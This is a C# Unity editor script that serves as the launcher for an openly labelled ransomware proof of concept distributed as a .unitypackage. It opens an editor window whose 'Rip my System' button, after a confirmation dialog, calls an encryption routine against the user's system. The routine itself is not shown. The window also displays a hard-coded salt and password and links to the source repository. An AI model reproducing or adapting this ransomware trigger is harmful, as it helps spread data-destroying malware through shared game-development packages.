using UnityEditor;
using UnityEngine;
using UnityExample.ThreadHandler;

//Unity is Requred for this.

namespace UnityExample
{
    [InitializeOnLoad]
    public class Main : EditorWindow
    {
        [MenuItem("Unity Ransomware Example/Start Ransomware", false, 500)]
        
        public static void ShowWindow()
        {
            Main window = EditorWindow.GetWindow<Main>();
            window.maxSize = new Vector2(650, 400);
            window.minSize = new Vector2(650, 400);
            GUIContent titleContent = new GUIContent("Ransomware Example");
            window.titleContent = titleContent;
        }
        public void OnGUI()
        {
            Debug.Log(".unitypackage Ransomware Example Loaded");
            GUILayout.Label("This is a Test for the Concept.");
            if (GUILayout.Button("Open Sourcecode"))
            {
                Application.OpenURL("https://github.com/none-development/unitypackage-ransomware");
            }
            GUILayout.Label("Press this Button to Start Encrypt you System. Salt: 35, Password: Test1234 . For Encrypt please use this.");
            if (GUILayout.Button("Rip my System"))
            {
                switch (EditorUtility.DisplayDialogComplex(".unitypackage Ransomware", "Do you really want to run the Ransomeware? None assumes no liability for damage to property during the execution of this script.", "Yes, start Ransomware", "No, dont Start", null))
                {
                    case 0:
                        //Start the encrypt Process
                        Crypto.Startencrypt(true);
                        break;
                    case 1:
                        break;
                    case 3:
                        break;
                }
                Debug.LogError("Unrecognized option.");
            }
           
        }
    }
}
